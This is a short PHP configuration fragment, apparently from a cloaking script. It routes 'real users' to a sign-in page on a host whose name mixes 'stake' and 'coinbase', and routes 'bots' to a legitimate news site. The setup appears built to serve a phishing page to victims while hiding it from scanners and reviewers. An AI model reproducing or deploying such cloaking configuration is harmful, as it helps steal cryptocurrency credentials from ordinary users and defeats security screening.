...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://stake-coinbase.web.app/signin';//PHP/HTML file or URL offer used for real users
$HCSET['WHITE_PAGE'] = 'https://www.mediapart.fr/';//PHP/HTML file or URL used for bots
